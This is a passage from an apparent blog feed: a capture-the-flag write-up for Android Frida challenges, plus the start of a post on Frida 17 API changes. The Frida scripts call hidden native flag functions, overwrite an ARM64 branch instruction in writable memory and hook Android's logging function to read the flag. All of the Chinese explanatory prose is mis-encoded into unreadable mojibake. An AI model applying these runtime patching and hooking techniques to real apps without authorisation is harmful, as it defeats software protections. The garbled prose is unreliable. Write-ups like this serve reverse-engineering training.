class="hljs-string">&quot;get_flag&quot;</span>))&#123;<br>                console.log(<span class="hljs-string">&quot;[*] &quot;</span> + e.name + <span class="hljs-string">&quot;: &quot;</span> + e.address);<br>                <span class="hljs-type">var</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> e.address;<br>                <span class="hljs-type">var</span> <span class="hljs-variable">get_flag_ptr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativePointer</span>(target);<br>                <span class="hljs-type">const</span> <span class="hljs-variable">My_get_flag</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(get_flag_ptr, <span class="hljs-string">&#x27;char&#x27;</span>, [<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>]);<br>                <span class="hljs-type">var</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> My_get_flag(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);<br>            &#125;<br>         &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        console.log(<span class="hljs-string">&quot;[-] Module not found: &quot;</span> + moduleName);<br>    &#125;<br>&#125;, <span class="hljs-number">2000</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/VStAbAkgnoXZ9uxnj4bczLkknmo.png"></p><p>ç”±äº ALSRï¼ˆåœ°å€éšæœºåŒ–ï¼‰çš„é—®é¢˜ï¼Œæ¯æ¬¡è¿è¡Œçš„æ—¶å€™å‡½æ•°çš„åœ°å€éƒ½æ˜¯ä¸åŒçš„ï¼Œä½†å˜åŒ–çš„åªæ˜¯åŸºå€ï¼Œè®¡ç®—å‡ºåç§»å°±å¯ä»¥åœ¨åç»­è¿è¡Œçš„æ—¶å€™ç›´æ¥è®¿é—®åˆ°å‡½æ•°çš„åœ°å€</p><p><strong>åç§» &#x3D; å‡½æ•°åœ°å€ - æ¨¡å—åŸºåœ°å€</strong></p><p><img src="/img/UaWRbuzROoqcBcxejt1ckYENnag.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">var</span> <span class="hljs-variable">adr</span> <span class="hljs-operator">=</span> Module.findBaseAddress(<span class="hljs-string">&quot;libfrida0xa.so&quot;</span>).add(<span class="hljs-number">0x18BB0</span>) <br><span class="hljs-type">var</span> <span class="hljs-variable">get_flag_ptr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativePointer</span>(adr);<br><span class="hljs-type">const</span> <span class="hljs-variable">get_flag</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(get_flag_ptr, <span class="hljs-string">&#x27;void&#x27;</span>, [<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>]);<br>get_flag(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><h1 id="0xB"><a href="#0xB" class="headerlink" title="0xB"></a>0xB</h1><p>æä¾›äº†ä¸€ä¸ª onCreate æ–¹æ³•åœ¨ç‚¹å‡»çš„æ—¶å€™ä¼šè°ƒç”¨</p><p><img src="/img/XXyvbvt4NolkYvxPERBcIhnBnew.png"></p><p>ä½†æ˜¯ç›´æ¥ç‚¹å¹¶ä¸ä¼šå¼¹ flag</p><p><img src="/img/Czumb2PJHo40aPx7OXKcMsdnnqc.png"></p><p>åç¼–è¯‘ JNI å‡½æ•°çš„æ—¶å€™ï¼Œå‘ç°åç¼–è¯‘å¤±è´¥ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªåŸå› å¯¼è‡´è¿”å›ä¸å‡ºå†…å®¹</p><p><img src="/img/PTlHb8Y7Gog49px4V5RcNMdjnlh.png"></p><p>åç¼–è¯‘å™¨ï¼ˆå¦‚ IDA Pro çš„ Hex-Rays Decompilerã€Ghidra çš„ Decompilerã€RetDec ç­‰ï¼‰åœ¨åˆ†æå¹¶å°è¯•å°† æ±‡ç¼–ä»£ç ï¼ˆæˆ–æœºå™¨ç ï¼‰è¿˜åŸä¸ºé«˜çº§è¯­è¨€ï¼ˆå¦‚ C&#x2F;C++ï¼‰ä»£ç  çš„è¿‡ç¨‹ä¸­ï¼Œä¼šåº”ç”¨ä¸€ç³»åˆ— ä¼˜åŒ–ä¸åˆ†æç­–ç•¥ï¼Œæ¯”å¦‚<strong>è‡ªåŠ¨ä¸¢å¼ƒä¸å¯è¾¾ä»£ç å—</strong></p><p><img src="/img/WyFgbmea2oslkIxwWOYcsgKDnkd.png"></p><p>ç›´æ¥æŸ¥çœ‹æ±‡ç¼–ï¼Œå‘ç°å‡½æ•°ä¸€å¼€å§‹ä¼šç›´æ¥å»æ¯”è¾ƒ <code>0xdeadbeef</code> ä¸ <code>0x539</code> çš„å€¼ï¼Œä½†è¿™ä¸¤ä¸ªå€¼æ°¸è¿œä¸å¯èƒ½ç›¸ç­‰å°±ä¼š jmp åˆ° <code>loc_171A6</code>ï¼Œä¹Ÿå°±ç›´æ¥ retn äº†ï¼Œæ‰€ä»¥è¿”å›ä¸å‡ºä»»ä½•å†…å®¹ï¼Œä¸èŠ±æŒ‡ä»¤çš„ä¸åŒçš„æ˜¯ï¼Œè¿™ç§æŒ‡ä»¤ç›´æ¥å½±å“äº†ä»£ç çš„æ‰§è¡Œé€»è¾‘</p><p><img src="/img/QyJAbllh9oriKDxDVkkcehlMnmd.png"></p><p>å°†ä¸­é—´çš„ <code>ä¸å¯è¾¾ä»£ç å—ï¼ˆUnreachable Code</code> NOP æ‰åå°±èƒ½æ­£å¸¸åç¼–è¯‘ä¼ªä»£ç äº†</p><p><img src="/img/DNFrbHeB7oRhMyxe5gacVRobnXd.png"></p><p><img src="/img/Amy0b98FEoFnfSxyX6GcSwWQncf.png"></p><p>è§£å¯†ä»£ç ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯å°†æ¯ä¸ªå­—ç¬¦çš„ ASCII å€¼å¼‚æˆ– 0x2c</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">encrypted = <span class="hljs-string">&quot;j~ehmWbmxezisdmogi~Q&quot;</span><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(encrypted[i]) ^ <span class="hljs-number">0x2c</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encrypted)))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Decrypted flag:&quot;</span>, flag)<br></code></pre></td></tr></table></figure><p><img src="/img/VhM6bjDhVoP6Jqxe9p0cL1nBn19.png"></p><p>ä½†è¿™ç§è§£æ³•ä¾èµ–äºæ‰‹åŠ¨ patch so æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ frida åœ¨ app è¿è¡Œæ—¶ç›´æ¥ä¿®æ”¹ native ä»£ç </p><p>è®¡ç®— NE æŒ‡ä»¤çš„åç§»</p><p>0x15248 - 0x15220 &#x3D; 0x28</p><p><img src="/img/EtNPblR9BoN8OHxZGqVcRSjpnYf.png"></p><p>å¯ä»¥ç›´æ¥é€šè¿‡ frida æ‰“å°å†…å­˜ä¸­çš„æ±‡ç¼–ä»£ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> moduleName = <span class="hljs-string">&quot;libfrida0xb.so&quot;</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-variable language_">module</span> = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(moduleName);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">module</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] Found module: &quot;</span> + <span class="hljs-variable language_">module</span>.<span class="hljs-property">name</span> + <span class="hljs-string">&quot; at &quot;</span> + <span class="hljs-variable language_">module</span>.<span class="hljs-property">base</span>);<br>    <span class="hljs-keyword">var</span> a =  <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">enumerateExports</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; a.<span class="hljs-property">length</span>; i++) &#123;<br>        <span class="hljs-keyword">var</span> e = a[i];<br>        <span class="hljs-keyword">if</span> (e.<span class="hljs-property">name</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;getFlag&quot;</span>))&#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] &quot;</span> + e.<span class="hljs-property">name</span> + <span class="hljs-string">&quot;: &quot;</span> + e.<span class="hljs-property">address</span>);<br><br>            <span class="hljs-keyword">var</span> be = e.<span class="hljs-property">address</span>.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x28</span>);<br>            <span class="hljs-keyword">var</span> currentAddr = e.<span class="hljs-property">address</span>;<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">15</span>; i++) &#123; <br>                <span class="hljs-keyword">const</span> instr = <span class="hljs-title class_">Instruction</span>.<span class="hljs-title function_">parse</span>(currentAddr);<br>                <span class="hljs-keyword">if</span> (!instr) &#123;<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[!] æ— æ³•è§£æåœ°å€: <span class="hljs-subst">$&#123;currentAddr&#125;</span>`</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;instr.address&#125;</span>    <span class="hljs-subst">$&#123;instr.toString()&#125;</span>`</span>);<br>                currentAddr = instr.<span class="hljs-property">next</span>; <br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åç§» 0x28 åçš„æŒ‡ä»¤æ˜¯ <code>b #0x6fc8055248</code>ï¼Œä½†æ ¹æ® ida åç¼–è¯‘çš„æ±‡ç¼–ä»¥åŠä¸Šä¸‹æ–‡æ¥çœ‹ï¼ŒBE è·³è½¬æŒ‡ä»¤ç¡®å®åœ¨è¿™ä¸ªåœ°å€ä¸Š</p><p><img src="/img/WK3wb7QmgoLaXtxnslxc6i2On4O.png"></p><p>ç”±äº arm64 æ¶æ„æ²¡æœ‰ç±»ä¼¼ nop è¿™æ ·çš„æŒ‡ä»¤ï¼Œæ‰€ä»¥åªèƒ½å°†æŒ‡ä»¤ä¿®æ”¹ä¸ºè·³è½¬åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤æ¥ç»•è¿‡</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> loglib = <span class="hljs-string">&quot;liblog.so&quot;</span>;<br>    <span class="hljs-keyword">var</span> log = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(loglib);<br>    <span class="hljs-keyword">if</span> (log) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] Found module: &quot;</span> + log.<span class="hljs-property">name</span> + <span class="hljs-string">&quot; at &quot;</span> + log.<span class="hljs-property">base</span>);<br>        <span class="hljs-keyword">var</span> a =  log.<span class="hljs-title function_">enumerateExports</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; a.<span class="hljs-property">length</span>; i++) &#123;<br>            <span class="hljs-keyword">var</span> e = a[i];<br>            <span class="hljs-keyword">if</span> (e.<span class="hljs-property">name</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;__android_log_print&quot;</span>))&#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] &quot;</span> + e.<span class="hljs-property">name</span> + <span class="hljs-string">&quot;: &quot;</span> + e.<span class="hljs-property">address</span>);<br>            <span class="hljs-keyword">var</span> logPrint = e.<span class="hljs-property">address</span>;<br>            <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(logPrint, &#123;<br>                <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) &#123;<br>                    <span class="hljs-keyword">var</span> flagPtr = args[<span class="hljs-number">3</span>];<br>                    <span class="hljs-keyword">var</span> flagValue = flagPtr.<span class="hljs-title function_">readCString</span>();<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] flag: &quot;</span> + flagValue + <span class="hljs-string">&quot;\n&quot;</span>);<br>                &#125;<br>        &#125;);<br><br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">var</span> moduleName = <span class="hljs-string">&quot;libfrida0xb.so&quot;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable language_">module</span> = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(moduleName);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">module</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] Found module: &quot;</span> + <span class="hljs-variable language_">module</span>.<span class="hljs-property">name</span> + <span class="hljs-string">&quot; at &quot;</span> + <span class="hljs-variable language_">module</span>.<span class="hljs-property">base</span>);<br>        <span class="hljs-keyword">var</span> a =  <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">enumerateExports</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; a.<span class="hljs-property">length</span>; i++) &#123;<br>            <span class="hljs-keyword">var</span> e = a[i];<br>            <span class="hljs-keyword">if</span> (e.<span class="hljs-property">name</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;getFlag&quot;</span>))&#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] &quot;</span> + e.<span class="hljs-property">name</span> + <span class="hljs-string">&quot;: &quot;</span> + e.<span class="hljs-property">address</span>);<br><br>                <span class="hljs-keyword">var</span> be = e.<span class="hljs-property">address</span>.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x28</span>);<br>                <span class="hljs-keyword">var</span> target = be.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x4</span>);<br>                <span class="hljs-keyword">var</span> currentAddr = e.<span class="hljs-property">address</span>;<br><br>                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">15</span>; i++) &#123;<br>                    <span class="hljs-keyword">const</span> instr = <span class="hljs-title class_">Instruction</span>.<span class="hljs-title function_">parse</span>(currentAddr);<br>                    <span class="hljs-keyword">if</span> (!instr) &#123;<br>                        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[!] æ— æ³•è§£æåœ°å€: <span class="hljs-subst">$&#123;currentAddr&#125;</span>`</span>);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;instr.address&#125;</span>    <span class="hljs-subst">$&#123;instr.toString()&#125;</span>`</span>);<br>                    currentAddr = instr.<span class="hljs-property">next</span>;<br>                &#125;<br>                <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">protect</span>(be, <span class="hljs-number">0x1000</span>, <span class="hljs-string">&quot;rwx&quot;</span>);<br>                <span class="hljs-keyword">var</span> writer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Arm64Writer</span>(be);<br>                <span class="hljs-keyword">try</span>&#123;<br><br>                    writer.<span class="hljs-title function_">putBImm</span>(target);  <span class="hljs-comment">//ä¿®æ”¹beä¸ºbl è·³è½¬åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤</span><br>                    writer.<span class="hljs-title function_">flush</span>();<br><br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br><br>                    writer.<span class="hljs-title function_">dispose</span>();<br><br>                &#125;<br><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;, <span class="hljs-number">2000</span>);<br></code></pre></td></tr></table></figure><p>éœ€è¦ç‚¹å‡»ä¸€ä¸‹æŒ‰é’®æ‰èƒ½è§¦å‘</p><p><img src="/img/UCf9bFWkWokJnPx9a01cpIH2nLb.png"></p><p>ç»“åˆå‰é¢å‡ å…³çš„å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä¸»åŠ¨è°ƒç”¨ native æ–¹æ³•è‡ªåŠ¨è¾“å‡º flag</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> loglib = <span class="hljs-string">&quot;liblog.so&quot;</span>;<br>    <span class="hljs-keyword">var</span> log = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(loglib);<br>    <span class="hljs-keyword">if</span> (log) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] Found module: &quot;</span> + log.<span class="hljs-property">name</span> + <span class="hljs-string">&quot; at &quot;</span> + log.<span class="hljs-property">base</span>);<br>        <span class="hljs-keyword">var</span> a =  log.<span class="hljs-title function_">enumerateExports</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; a.<span class="hljs-property">length</span>; i++) &#123;<br>            <span class="hljs-keyword">var</span> e = a[i];<br>            <span class="hljs-keyword">if</span> (e.<span class="hljs-property">name</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;__android_log_print&quot;</span>))&#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] &quot;</span> + e.<span class="hljs-property">name</span> + <span class="hljs-string">&quot;: &quot;</span> + e.<span class="hljs-property">address</span>);<br>            <span class="hljs-keyword">var</span> logPrint = e.<span class="hljs-property">address</span>;<br>            <span class="hljs-title class_">Interceptor</span>.<span class="hljs-title function_">attach</span>(logPrint, &#123;<br>                <span class="hljs-attr">onEnter</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) &#123;<br>                    <span class="hljs-keyword">var</span> flagPtr = args[<span class="hljs-number">3</span>];<br>                    <span class="hljs-keyword">var</span> flagValue = flagPtr.<span class="hljs-title function_">readCString</span>();<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] flag: &quot;</span> + flagValue + <span class="hljs-string">&quot;\n&quot;</span>);<br>                &#125;<br>        &#125;);<br><br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">var</span> moduleName = <span class="hljs-string">&quot;libfrida0xb.so&quot;</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable language_">module</span> = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(moduleName);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">module</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] Found module: &quot;</span> + <span class="hljs-variable language_">module</span>.<span class="hljs-property">name</span> + <span class="hljs-string">&quot; at &quot;</span> + <span class="hljs-variable language_">module</span>.<span class="hljs-property">base</span>);<br>        <span class="hljs-keyword">var</span> a =  <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">enumerateExports</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; a.<span class="hljs-property">length</span>; i++) &#123;<br>            <span class="hljs-keyword">var</span> e = a[i];<br>            <span class="hljs-keyword">if</span> (e.<span class="hljs-property">name</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;getFlag&quot;</span>))&#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] &quot;</span> + e.<span class="hljs-property">name</span> + <span class="hljs-string">&quot;: &quot;</span> + e.<span class="hljs-property">address</span>);<br><br>                <span class="hljs-keyword">var</span> be = e.<span class="hljs-property">address</span>.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x28</span>);<br>                <span class="hljs-keyword">var</span> target = be.<span class="hljs-title function_">add</span>(<span class="hljs-number">0x4</span>);<br>                <span class="hljs-keyword">var</span> currentAddr = e.<span class="hljs-property">address</span>;<br><br>                <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">15</span>; i++) &#123;<br>                    <span class="hljs-keyword">const</span> instr = <span class="hljs-title class_">Instruction</span>.<span class="hljs-title function_">parse</span>(currentAddr);<br>                    <span class="hljs-keyword">if</span> (!instr) &#123;<br>                        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[!] æ— æ³•è§£æåœ°å€: <span class="hljs-subst">$&#123;currentAddr&#125;</span>`</span>);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;instr.address&#125;</span>    <span class="hljs-subst">$&#123;instr.toString()&#125;</span>`</span>);<br>                    currentAddr = instr.<span class="hljs-property">next</span>;<br>                &#125;<br>                <span class="hljs-title class_">Memory</span>.<span class="hljs-title function_">protect</span>(be, <span class="hljs-number">0x1000</span>, <span class="hljs-string">&quot;rwx&quot;</span>);<br>                <span class="hljs-keyword">var</span> writer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Arm64Writer</span>(be);<br>                <span class="hljs-keyword">try</span>&#123;<br><br>                    writer.<span class="hljs-title function_">putBImm</span>(target);<br>                    writer.<span class="hljs-title function_">flush</span>();<br><br>                &#125; <span class="hljs-keyword">finally</span> &#123;<br><br>                    writer.<span class="hljs-title function_">dispose</span>();<br><br>                &#125;<br><br>                <span class="hljs-comment">//ä¸»åŠ¨è°ƒç”¨get_flagæ–¹æ³•</span><br>                <span class="hljs-keyword">var</span> target = e.<span class="hljs-property">address</span>;<br>                <span class="hljs-keyword">var</span> get_flag_ptr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativePointer</span>(target);<br>                <span class="hljs-keyword">const</span> <span class="hljs-title class_">My</span>_get_flag = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NativeFunction</span>(get_flag_ptr, <span class="hljs-string">&#x27;void&#x27;</span>, []);<br>                <span class="hljs-keyword">var</span> flag = <span class="hljs-title class_">My</span>_get_flag();<br><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;, <span class="hljs-number">2000</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/FhmAb0ehjoXgdux49V5cj3CSnmb.png"></p>]]></content>
    
    
    <categories>
      
      <category>ç§»åŠ¨å®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>frida17è¸©å‘</title>
    <link href="/2025/09/07/frida17%E8%B8%A9%E5%9D%91/"/>
    <url>/2025/09/07/frida17%E8%B8%A9%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<h1 id="frida17-è¸©å‘"><a href="#frida17-è¸©å‘" class="headerlink" title="frida17 è¸©å‘"></a>frida17 è¸©å‘</h1><h1 id="è¸©å‘-1"><a href="#è¸©å‘-1" class="headerlink" title="è¸©å‘ 1"></a>è¸©å‘ 1</h1><p>å¹³å¸¸éƒ½å¯ä»¥ç”¨å…¨å±€å¯¹è±¡æ¯”å¦‚ Module è¿™ç±»çš„å»è°ƒç”¨ api è·å–å¯¼å‡ºè¡¨ï¼Œç¬¦å·è¡¨ä¹‹ç±»çš„</p><p>ä½†ä¸­ frida17 ç›´æ¥è°ƒç”¨ä¼šç›´æ¥æç¤ºï¼š<code>TypeError: not a function</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">Module.enumerateExports(&quot;libfrida0x8.so&quot;)<br></code></pre></td></tr></table></figure><p><img src="/img/SqIJbdxBeo2nDdx6uhzczE97ned.png"></p><p>åé¢è¯•äº†å…¶ä»–çš„ api å‘ç°ä¸€ä¸ªéƒ½æ²¡æœ‰ï¼Œé—®äº† AI ä¹Ÿæ— æœï¼Œä½†é‰´äºåº”è¯¥ä¸ä¼šåªæœ‰æˆ‘è¿™æ ·ï¼Œå·®äº†ä¸€ä¸‹ github çš„ issue å‘ç°ï¼Œç°åœ¨è¦æ¨¡å—å¯¹è±¡æ¥è°ƒç”¨ API</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> moduleName = <span class="hljs-string">&quot;libfrida0x8.so&quot;</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-variable language_">module</span> = <span class="hljs-title class_">Process</span>.<span class="hljs-title function_">findModuleByName</span>(moduleName);<br><span 